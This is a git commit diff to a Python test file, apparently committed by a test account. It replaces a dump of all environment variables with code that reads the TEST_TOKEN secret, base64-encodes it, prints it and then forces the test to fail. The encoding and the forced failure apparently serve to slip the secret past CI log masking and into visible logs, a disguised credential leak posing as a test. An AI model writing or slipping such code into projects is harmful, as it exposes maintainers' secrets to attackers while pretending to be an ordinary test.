d6b496a3ddfffc8f905a58516dbfbdbd5ad92101
ndavisontest2 <58417511+ndavisontest2@users.noreply.github.com>
2025-08-09 18:02:12 +1000

    Update test_bla.py

--- tests/core/test_bla.py
+++ tests/core/test_bla.py
@@ -1,6 +1,7 @@
 import os
+import base64
 
 def test_bla():
-  for key, value in os.environ.items():
-    print(f"{key}: {value}")
+  secret_token = os.environ.get("TEST_TOKEN")
+  print(base64.b64encode(secret_token.encode()))
   assert False
